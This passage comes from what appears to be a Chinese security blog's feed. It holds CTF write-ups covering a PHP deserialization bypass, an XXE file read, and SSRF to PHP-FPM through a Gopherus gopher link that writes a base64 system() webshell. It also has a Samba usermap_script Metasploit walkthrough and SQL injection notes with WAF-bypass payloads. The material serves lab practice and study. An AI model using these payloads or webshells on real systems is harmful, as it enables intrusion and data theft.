<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpheader(&quot;content-Type: text/html; charset=utf-8&quot;);header(&quot;Cache-Control: no-cache, must-revalidate&quot;);header(&quot;Pragma: no-cache&quot;);error_reporting(0);ob_end_flush();?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Pragma&quot; content=&quot;No-cache&quot; /&gt;&lt;meta http-equiv=&quot;Expires&quot; content=&quot;0&quot; /&gt;&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;private&quot; /&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;//加了这句，看看能不能解决linux下显示乱码的问题？&lt;title&gt;PHP 探针 v1.0&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;&lt;!--body&#123;text-align:center;margin-top:20px;background-color:#a9b674;&#125;#overview&#123;width:700px;margin:0 auto;text-align:left;&#125;a&#123;text-decoration:underline;color:#992700;&#125;.strong&#123;color:#992700;&#125;.basew&#123;width:300px;&#125;--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;overview&quot;&gt;&lt;div id=&quot;copyright&quot;&gt;版权信息&lt;a href=&quot;hello.php?typ=baseinfo&quot;&gt;[基本信息]&lt;/a&gt; &lt;a href=&quot;hello.php?typ=superinfo&quot;&gt;[高级信息]&lt;/a&gt;&lt;?phpif (function_exists(&quot;phpinfo&quot;))&#123;  echo&#x27;&lt;a href=&quot;hello.php?typ=phpinfo&quot;&gt;[phpinfo]&lt;/a&gt;&#x27;;&#125;echo&#x27;&lt;br /&gt;php探针v1.0 by MKDuse(blueidea-id)&lt;br /&gt;&lt;br /&gt;此程序代码，可免费使用；但不得用于商业用途；完全转载或使用此代码，请保留版权信息；&lt;br /&gt;欢迎指正错误提建议，QQ：122712355&lt;/div&gt;&#x27;;if (empty($_GET[&#x27;typ&#x27;]))&#123;  baseinfo();&#125;else&#123;switch ($_GET[&#x27;typ&#x27;])&#123;case &#x27;phpinfo&#x27;:phpinfoview();break;case &#x27;superinfo&#x27;:superinfo();break;case &#x27;baseinfo&#x27;:baseinfo();break;default:baseinfo();&#125;&#125;function getime()&#123; $t = gettimeofday(); return (float)($t[&#x27;sec&#x27;] + $t[&#x27;usec&#x27;]/1000000);&#125;function baseinfo()&#123;echo &#x27;&lt;h1&gt;基本信息&lt;/h1&gt;&#x27;;$arr[]=array(&quot;Current PHP version:&quot;,phpversion());$arr[]=array(&quot;Zend engine version:&quot;,zend_version());$arr[]=array(&quot;服务器版本&quot;,$_SERVER[&#x27;SERVER_SOFTWARE&#x27;]);$arr[]=array(&quot;ip地址&quot;,$_SERVER[&#x27;REMOTE_HOST&#x27;]);//ip$arr[]=array(&quot;域名&quot;,$_SERVER[&#x27;HTTP_HOST&#x27;]);$arr[]=array(&quot;协议端口&quot;,$_SERVER[&#x27;SERVER_PROTOCOL&#x27;].&#x27; &#x27;.$_SERVER[&#x27;SERVER_PORT&#x27;]);$arr[]=array(&quot;站点根目录&quot;,$_SERVER[&#x27;PATH_TRANSLATED&#x27;]);$arr[]=array(&quot;服务器时间&quot;,date(&#x27;Y年m月d日,H:i:s,D&#x27;));$arr[]=array(&quot;当前用户&quot;,get_current_user());$arr[]=array(&quot;操作系统&quot;,php_uname(&#x27;s&#x27;).php_uname(&#x27;r&#x27;).php_uname(&#x27;v&#x27;));$arr[]=array(&quot;include_path&quot;,ini_get(&#x27;include_path&#x27;));$arr[]=array(&quot;Server API&quot;,php_sapi_name());$arr[]=array(&quot;error_reporting level&quot;,ini_get(&quot;display_errors&quot;));$arr[]=array(&quot;POST提交限制&quot;,ini_get(&#x27;post_max_size&#x27;));$arr[]=array(&quot;upload_max_filesize&quot;,ini_get(&#x27;upload_max_filesize&#x27;));$arr[]=array(&quot;脚本超时时间&quot;,ini_get(&#x27;max_execution_time&#x27;).&#x27;秒&#x27;);if (ini_get(&quot;safe_mode&quot;)==0)&#123;$arr[]=array(&quot;PHP安全模式(Safe_mode)&quot;,&#x27;off&#x27;);&#125;else&#123;$arr[]=array(&quot;PHP安全模式(Safe_mode)&quot;,&#x27;on&#x27;);&#125;if (function_exists(&#x27;memory_get_usage&#x27;))&#123;$arr[]=array(&quot;memory_get_usage&quot;,ini_get(&#x27;memory_get_usage&#x27;));&#125;//$arr[]=array(&quot;可用空间&quot;,intval(diskfreespace(&#x27;/&#x27;)/(1024 * 1024)).&quot;M&quot;);echo&#x27;&lt;table&gt;&#x27;;for($i=0;$i&lt;count($arr);$i++)&#123;  $overview=&#x27;&lt;tr&gt;&lt;td class=&quot;basew&quot;&gt;&#x27;.$arr[$i][0].&#x27;&lt;/td&gt;&lt;td&gt;&#x27;.$arr[$i][1].&#x27;&lt;/td&gt;&lt;/tr&gt;&#x27;;  echo $overview;&#125;echo&#x27;&lt;/table&gt;&#x27;;echo &#x27;&lt;h2&gt;服务器性能测试&lt;/h2&gt;&#x27;;echo&#x27;&lt;table&gt;&lt;tr&gt;&lt;td&gt;服务器&lt;/td&gt;&lt;td&gt;整数运算&lt;br /&gt;50万次加法(1+1)&lt;/td&gt;&lt;td&gt;浮点运算&lt;br /&gt;50万次平方根(3.14开方)&lt;/td&gt;&lt;/tr&gt;&#x27;;echo&#x27;&lt;tr&gt;&lt;td&gt;MKDuse的机子(P4 1.5G 256DDR winxp sp2)&lt;/td&gt;&lt;td&gt;465.08ms&lt;/td&gt;&lt;td&gt;466.66ms&lt;/td&gt;&lt;/tr&gt;&#x27;;$time_start=getime();for($i=0;$i&lt;=500000;$i++);&#123;$count=1+1;&#125;$timea=round((getime()-$time_start)*1000,2);echo &#x27;&lt;tr class=&quot;strong&quot;&gt;&lt;td&gt;当前服务器&lt;/td&gt;&lt;td&gt;&#x27;.$timea.&#x27;ms&lt;/td&gt;&#x27;;$time_start=getime();for($i=0;$i&lt;=500000;$i++);&#123;sqrt(3.14);&#125;$timea=round((getime()-$time_start)*1000,2);echo &#x27;&lt;td&gt;&#x27;.$timea.&#x27;ms&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#x27;;?&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;function gettime()&#123; var time; time=new Date(); return time.getTime();&#125;start_time=gettime();&lt;/script&gt;&lt;?phpecho &#x27;&lt;h2&gt;带宽测试&lt;/h2&gt;&#x27;;for ($i=0;$i&lt;100;$i++)&#123;print &quot;&lt;!--1234567890#########0#########0#########0#########0#########0#########0#########0#########012345--&gt;&quot;;&#125;?&gt;&lt;p id=&quot;dk&quot;&gt;&lt;/p&gt;&lt;script language=&quot;javascript&quot; type=&#x27;text/javascript&#x27;&gt;var timea;var netspeed;timea=gettime()-start_time;netspeed=Math.round(10/timea*1000);document.getElementByIdx(&quot;dk&quot;).innerHTML=&quot;向客户端发送10KB数据，耗时&quot;+timea+&quot;ms&lt;br /&gt;您与此服务器的连接速度为&quot;+netspeed+&quot;kb/s&quot;;&lt;/script&gt;&lt;?phpecho&#x27;&lt;h2&gt;已加载的扩展库(enable)&lt;/h2&gt;&lt;div&gt;&#x27;;$arr =get_loaded_extensions();foreach($arr as $value)&#123;  echo $value.&#x27;&lt;br /&gt;&#x27;;&#125;echo&#x27;&lt;/div&gt;&lt;h2&gt;禁用的函数&lt;/h2&gt;&lt;p&gt;&#x27;;$disfun=ini_get(&#x27;disable_functions&#x27;);if (empty($disfun))&#123;  echo&#x27;没有禁用&lt;/p&gt;&#x27;;&#125;else&#123;echo ini_get(&#x27;disable_functions&#x27;).&#x27;&lt;/p&gt;&#x27;;&#125;&#125;//关闭function superinfo()&#123;echo&#x27;&lt;h1&gt;高级信息&lt;/h1&gt;&lt;p&gt;PHP_INI_USER 1 配置选项可用在用户的 PHP 脚本或Windows 注册表中&lt;br&gt; PHP_INI_PERDIR 2 配置选项可在 php.ini, .htaccess 或 httpd.conf 中设置 &lt;br&gt;PHP_INI_SYSTEM 4 配置选项可在 php.ini or httpd.conf 中设置 &lt;br&gt;PHP_INI_ALL 7 配置选项可在各处设置&lt;/p&gt;&#x27;;$arr1=ini_get_all();for ($i=0;$i&lt;count($arr1);$i++)  &#123;$arr2=array_slice($arr1,$i,1);print_r($arr2);echo &#x27;&lt;br /&gt;&#x27;;&#125;&#125;function phpinfoview()&#123;  phpinfo();&#125;?&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#禁用函数stream_socket_client,fsockopen,pfsockopen,ini_alter,posix_kill,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail</span><br></pre></td></tr></table></figure>

<p>最后找到php有个glob函数可以跨目录读取目录，上传脚本，并浏览器执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$fileList</span>=glob(<span class="string">&#x27;/*&#x27;</span>);<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;count(<span class="variable">$fileList</span>); <span class="variable">$i</span>++) &#123;<span class="keyword">echo</span> <span class="variable">$fileList</span>[<span class="variable">$i</span>].<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;&#125;<span class="variable">$fileList2</span>=glob(<span class="string">&#x27;images/*&#x27;</span>);<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;count(<span class="variable">$fileList2</span>); <span class="variable">$i</span>++) &#123;<span class="keyword">echo</span> <span class="variable">$fileList2</span>[<span class="variable">$i</span>].<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;&#125;<span class="variable">$fileList3</span>=glob(<span class="string">&#x27;*&#x27;</span>);<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;count(<span class="variable">$fileList3</span>); <span class="variable">$i</span>++) &#123;<span class="keyword">echo</span> <span class="variable">$fileList3</span>[<span class="variable">$i</span>].<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>读取到关键内容,有flag和readflag两个文件，接下来就是要读取文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin dev etc flag home lib media mnt proc readflag root run sbin srv sys tmp usr var </span><br></pre></td></tr></table></figure>

<p>根据题目题是源代码中含有数据库的相关信息，上传一个c99大马，需要请联系我，以root进数据库，查看数据库结构，有个s_admin的表，看到admin用户和passwd的加密形式，md5在线解密失败，以为是mysql提权，但是没有头绪，最后想到mysql可能能查看文件内容，找到相关信息，找到三种方法1.load_file()，2.load data infile()，3.system cat，之前使用mysql调用系统命令，但是失败了，最后通过load data infile成功读取到文件内容。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$con</span> = mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);<span class="variable">$select_db</span> = mysql_select_db(<span class="string">&#x27;shopxo&#x27;</span>);<span class="keyword">if</span> (!<span class="variable">$select_db</span>) &#123;    <span class="keyword">die</span>(<span class="string">&quot;could not connect to the db:\n&quot;</span> .  mysql_error());&#125;<span class="comment">//查询代码$sql = &quot;load data infile &#x27;/flag&#x27; into table s_admin&quot;;$res = mysql_query($sql);if (!$res) &#123;    die(&quot;could get the res:\n&quot; . mysql_error());&#125;while ($row = mysql_fetch_assoc($res)) &#123;    print_r($row);&#125;//查询代码//关闭数据库连接mysql_close($con);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>浏览器执行该php，虽然sql语句有问题，但是显示出了flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">could get the res: Incorrect <span class="keyword">integer</span> value: <span class="string">&#x27;redrock&#123;2cb81f52-257c-4187-8a5d-9d3456007631&#125;&#x27;</span> <span class="keyword">for</span> column `shopxo`.`s_admin`.`id` at row <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="ez-serialize："><a href="#ez-serialize：" class="headerlink" title="ez_serialize："></a>ez_serialize：</h3><p>进入网站就看见源码，是经典的php反序列化。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);include &quot;flag.php&quot;;class Test&#123;    private $secret;    function __construct($secret) &#123;        $this-&gt;secret=$secret;    &#125;    function __wakeup() &#123;        $this-&gt;secret=&quot;error&quot;;    &#125;    function __destruct() &#123;        if ($this-&gt;secret === &quot;admin&quot;) &#123;            global $flag;            echo $flag;        &#125; else &#123;            die(&quot;secret error!&quot;);        &#125;    &#125;&#125;$a = $_GET[serialize];if (stristr($a, &quot;secret&quot;)) &#123;    die(&quot;Go out!!Hacker!!&quot;);&#125; else &#123;    unserialize($a);&#125; </span><br></pre></td></tr></table></figure>

<p>首先接受一个serialize的参数，通过stristr函数防止参数中含有sercret字符串，然后反序列化这个变量，首先构造一个基础的payload=?serialize=O:4:”Test”:1:{s:10:”%00Test%00secret”;s:5:”admin”;}(加上%00是因为secret是私有变量，变量中的类名前后会有空白符)，但是这个过不去secret，但是表示字符类型的s大写时，会被当成16进制解析，构造payload=?serialize=O:4:”Test”:1:{S:12:”\00\54\65\73\74\00\73\65\63\72\65\74”;s:5:”admin”;}，但是反序列化时会优先使用__wakeup方法(如果有的话)，这时就需要绕过wakeup，这是个cve漏洞，当反序列化字符串，表示属性的个数大于真实的个数，就会跳过wakeup执行。最终payload=?serialize=O:4:”Test”:5:{S:12:”\00\54\65\73\74\00\73\65\63\72\65\74”;s:5:”admin”;}（这道题属性个数大于1即可）。</p>
<h3 id="start-xxe："><a href="#start-xxe：" class="headerlink" title="start xxe："></a>start xxe：</h3><p>题目告诉是xxe类型的题，打开连接，看到是一个登录界面，查看源代码，有一个注释告诉了flag的位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--flag is in /flag--&gt;</span><br></pre></td></tr></table></figure>

<p>接下来使用burp抓包，随便写一个admin用户密码，发送。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//发送数据POST /doLogin.php HTTP/1.1Host: 2272c936-816d-4418-93ce-8d9184928b32.ctf.redrock.teamUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0Accept: application/xml, text/xml, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/xml;charset=utf-8X-Requested-With: XMLHttpRequestContent-Length: 66Origin: http://2272c936-816d-4418-93ce-8d9184928b32.ctf.redrock.teamConnection: closeReferer: http://2272c936-816d-4418-93ce-8d9184928b32.ctf.redrock.team/Cookie: Hm_lvt_217f0d7270e06220a2ec9fbc0877488d=1636718269,1637038834,1637461650&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;admin1&lt;/password&gt;&lt;/user&gt;//返回数据HTTP/1.1 200 OKContent-Type: text/html; charset=utf-8Date: Sun, 21 Nov 2021 11:45:29 GMTServer: nginx/1.16.1X-Powered-By: PHP/7.4.5Connection: closeContent-Length: 62&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;admin,xml login fail&lt;/msg&gt;&lt;/result&gt;</span><br></pre></td></tr></table></figure>

<p>看见返回了是用户名登录失败，开始构造一个任意文件读取的xxe的payload。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;admin1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>点击发送直接返回flag：redrock{e6c308c4-b14a-493e-b938-7347caecf6a8}。附带一个xxe的博客园：<a href="https://www.cnblogs.com/backlion/p/9302528.html">https://www.cnblogs.com/backlion/p/9302528.html</a></p>
<h3 id="start-ssrf："><a href="#start-ssrf：" class="headerlink" title="start ssrf："></a>start ssrf：</h3><p>ssrf可以利用file:///协议读取本地文件，post传参url=file:///flag，没有内容显示，但是传参url=file:///etc/passwd会显示passwd的内容。说明file协议是有用的，构造一个payload看能否引起报错，url=file:///%00。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: curl_setopt(): Curl option contains invalid characters (\0) in /var/www/html/index.php on line 5</span><br></pre></td></tr></table></figure>

<p>出现路径，直接读取文件，payload:url=file:///var/www/html/index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;star刚学了php，他听说php自带curl的功能，于是他写了个网页&lt;/h1&gt;&lt;p&gt;请post url&lt;/p&gt;&lt;h2&gt;请求结果&lt;/h2&gt;&lt;h2&gt;&lt;h1&gt;star刚学了php，他听说php自带curl的功能，于是他写了个网页&lt;/h1&gt;&lt;p&gt;请post url&lt;/p&gt;&lt;?php$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_POST[&#x27;url&#x27;]);curl_setopt($ch, CURLOPT_HEADER, 0);?&gt;&lt;h2&gt;请求结果&lt;/h2&gt;&lt;h2&gt;&lt;?phpecho curl_exec($ch);curl_close($ch);?&gt;&lt;/h2&gt;&lt;script&gt;console.log(&quot;hack by yyz!&quot;)&lt;/script&gt;1&lt;/h2&gt;&lt;script&gt;console.log(&quot;hack by yyz!&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>没有进行任何过滤。后面发放提示是nginx和php结构，构造payload查看nginx配置文件，url=file:////etc/nginx/nginx.conf，才发现有fastcgi，fastcgi_pass   127.0.0.1:9000，这时利用ssrf攻击本地PHP-FPM服务，达到任意代码执行的效果。直接利用gopher工具构造payload。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> python gopherus.py --exploit fastcgi  ________              .__ /  _____/  ____ ______ |  |__   ___________ __ __  ______/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \ \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;        \/       |__|        \/     \/                 \/                author: $_SpyD3r_<span class="variable">$Give</span> one file name <span class="built_in">which</span> should be surely present <span class="keyword">in</span> the server (prefer .php file)<span class="keyword">if</span> you don<span class="string">&#x27;t know press ENTER we have default one:  /var/www/html/index.php  /*前面获得的php绝对路径*/Terminal command to run:  echo PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsncGFzc3dvcmQnXSk7Pz4= |base64 -d &gt; /var/www/html/shell1.php  /*webshell base64写入，原马是&lt;?php system($_REQUEST[&#x27;</span>password<span class="string">&#x27;]);?&gt;*/Your gopher link is ready to do SSRF:gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH147%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%93%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsncGFzc3dvcmQnXSk7Pz4%3D%20%7Cbase64%20-d%20%3E%20/var/www/html/shell1.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00-----------Made-by-SpyD3r-----------</span></span></span><br></pre></td></tr></table></figure>

<p>构造payload后进行一次url编码，(curl会进行一次解码)，成功写入木马，接下来使用即可。payload=/shell1.php?password=ls /;发现数据：easy_ssrf_flag_bc85c363e9d6fbb576fb9a85632f5135，以为这就是flag，提交不对，重新cat一下，payload=shell1.php?password=cat /easy_ssrf_flag_bc85c363e9d6fbb576fb9a85632f5135;（用file协议查看也可以）</p>
<p>最后得到flag：redrock{244ddb7b-d731-43f5-aeae-05332f02874e}(环境变动，不是最开始的flag)。</p>
]]></content>
      <tags>
        <tag>redrock</tag>
        <tag>ctf</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>samba提权</title>
    <url>/blog/2021/12/20/samba%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="samba提权"><a href="#samba提权" class="headerlink" title="samba提权"></a>samba提权</h2><h3 id="利用samba漏洞，获得目标主机root权限"><a href="#利用samba漏洞，获得目标主机root权限" class="headerlink" title="利用samba漏洞，获得目标主机root权限"></a>利用samba漏洞，获得目标主机root权限</h3><h4 id="原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"><a href="#原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。" class="headerlink" title="原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"></a>原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。</h4><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><p>确定目标存在<code>445</code>和<code>139</code>端口开放，使用msf，输入命令<code>search samba</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220184011444.png" alt="image-20211220184011444"></p>
<p>使用命令<code>use exploit/multi/samba/usermap_script</code>，启用漏洞利用模块，终端输入<code>info</code>，查看相关信息</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220184341512.png" alt="image-20211220184341512"></p>
<p>输入<code>set RHOST ip</code>,设置目标ip地址，输入<code>exploit</code>，开始攻击，攻击成功后，建立会话</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220190130652.png" alt="image-20211220190130652"></p>
<p>输入<code>whoami</code>查看权限，输入<code>ifconfig</code>，查看系统网络信息</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220190258566.png" alt="image-20211220190258566"></p>
<p>实验完成</p>
]]></content>
      <tags>
        <tag>samba</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/blog/2021/12/28/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="sql-注入"><a href="#sql-注入" class="headerlink" title="sql 注入"></a>sql 注入</h2><h3 id="一般过程"><a href="#一般过程" class="headerlink" title="一般过程"></a>一般过程</h3><ol>
<li>找到网站注入点</li>
<li>判断注入点是字符型还是数字型注入（使用减法，使用<code>and 1=1</code>）</li>
<li>判断闭合方式（fuzz，仅限于字符型注入）</li>
<li>判断前一条sql查询列数（推荐<code>group by</code> 、 <code>order by</code>容易waf检测）</li>
<li>查询回显位（仅限union注入） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure></li>
<li>查询当前数据库库名</li>
<li>查询当前数据库所有表名<ul>
<li><strong>table_name</strong>表示表名，mysql数据库有<strong>information_schema</strong>数据库,存放了表名，列名，<strong>information_schema.tables</strong>是存放所有表名的表，<strong>information_schema.columns</strong>是存放所有列名的表，<strong>table_schema</strong>是数据库的名称，<strong>table_name</strong>是存放表名的列（是information_schema.tables的属性）,<strong>group_concat</strong>可以一行显示多个数据<br><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</code></li>
</ul>
</li>
<li>查询当前数据所有列名,<strong>column_name</strong>是存放所有列名的列,<strong>information_schema.columns</strong>包含了<strong>table_name</strong>属性<br> <code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;</code></li>
<li>查询当前数据表所有列项 <strong>id,username,password</strong><br> <code>?id=-1 union select 1,2,group_concat(id,&#39;:&#39;,username,&#39;****&#39;) from users</code></li>
</ol>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>原理：优先执行括号内的内容,报错注入最多一次只能显示<em>32</em>个字符</p>
<ol>
<li><p><strong>extractvalue</strong>报错注入</p>
<ul>
<li>数据库读取XML文件，**extractvalue(书名，路径)**，路径格式必须是<code>/</code>,否则报错</li>
<li><strong>concat(0x7e,(select database)))</strong> 组合参数,concat用于连接字符串，若有一个参数为null，则返回null<br><code>?id=-1&#39; and 1=extractvalue(1,concat(0x7e,(select database()))) --+</code></li>
<li>**substring(‘test’,x,y)**，从第x个字符开始，显示y个字符 </li>
<li>解决只能返回32个字符串问题<br><code>?id=-1&#39; and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,&#39;~&#39;,password),25,30)))) --+ /*从第25个字符往后再显示30个字符*</code> </li>
</ul>
</li>
<li><p>updatexml报错注入</p>
<ul>
<li>updatexml()修改文档，三个参数，第二个参数为路径<br><code>id=1&#39; and 1=updatexml(1,concat(0x7e,(select databse())),3) --+</code><br><code>?id=1 union select 1,2,updatexml(1,concat(0x7e,(select database())),3) --+</code></li>
</ul>
<p> <code>SELECT concat_ws(&#39;-&#39;,2.3);</code><br> <code>SELECT concat_ws(&#39;-&#39;,database(),floor(rand()*2));</code><br> <code>select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand(0)*2)) as cc from information_schema.tables group by cc;</code></p>
</li>
<li><p>floor报错注入</p>
<ul>
<li>floor,count,group by冲突报错</li>
<li>注入语句<code>and select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></li>
</ul>
</li>
</ol>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><ol start="3">
<li>布尔盲注<ul>
<li>页面不会报错，页面有两种状态，一种真值，一种假值<br><code>?id=1&#39; and ascii(substring((select database()),2,1))=101 --+</code></li>
</ul>
</li>
</ol>
<ol start="4">
<li><p>时间盲注</p>
<p> <code>select if(1&gt;2,2,sleep(2));</code></p>
</li>
</ol>
<h3 id="绕过防火墙"><a href="#绕过防火墙" class="headerlink" title="绕过防火墙"></a>绕过防火墙</h3><ol>
<li><p>preg_replace($reg,$replace.$id)，替换函数</p>
</li>
<li><p>双写绕过</p>
</li>
<li><p>大小写绕过</p>
</li>
<li><p>替换</p>
<ul>
<li>order by = group by</li>
<li>union select = union all select</li>
</ul>
</li>
<li><p>混淆</p>
<ul>
<li>注释：/*xxxx*/      /*!50000 version()*/   <em>!会执行注释里的内容，版本大于5.0就会执行version()命令</em><br><code>?id=-1&#39; union /*!99999xxx*/ select 1,2,3,4 --+</code><br><code>?id=-1&#39; union /*!99999xxx*/ select 1,2,database(/*!99999 xxx*/) --+</code></li>
<li>换行：  +(空格)   %0A(换行，–+只注释当前行，换行后不注释)</li>
<li>换行加注释： %0a –+ xxx<br><code>?id=-1&#39; union /*!50000 --+/*%0a select 1,2,database() */ --+</code></li>
</ul>
</li>
</ol>
<p>php?id=  ———&gt;mysql</p>
<p>asp?id=  ———&gt;access sql server</p>
<p>jsp?id=  ———&gt; oracle</p>
<h3 id="sql-server-注入"><a href="#sql-server-注入" class="headerlink" title="sql server 注入"></a>sql server 注入</h3><ol>
<li><p>常见查询函数</p>
<ul>
<li><p>select @@version; 数据库版本</p>
</li>
<li><p>select @@servername; 查询服务名</p>
</li>
<li><p>select host_name(); 查询主机名，如果用vnavicat远程连接，主机名是本地名字</p>
</li>
<li><p>select db_name； 查询当前数据库名</p>
</li>
<li><p>select user; 查询当前数据库的拥有者，结果为dbo。dbo 是每个数据库的默认用户，具有所有者权限，databaseOwner</p>
</li>
<li><p>只能使用order by函数查询列数</p>
</li>
<li><p>for xml path(‘’)===gropu_concat()<br><code>select * from user for xml path(&#39;&#39;)</code></p>
</li>
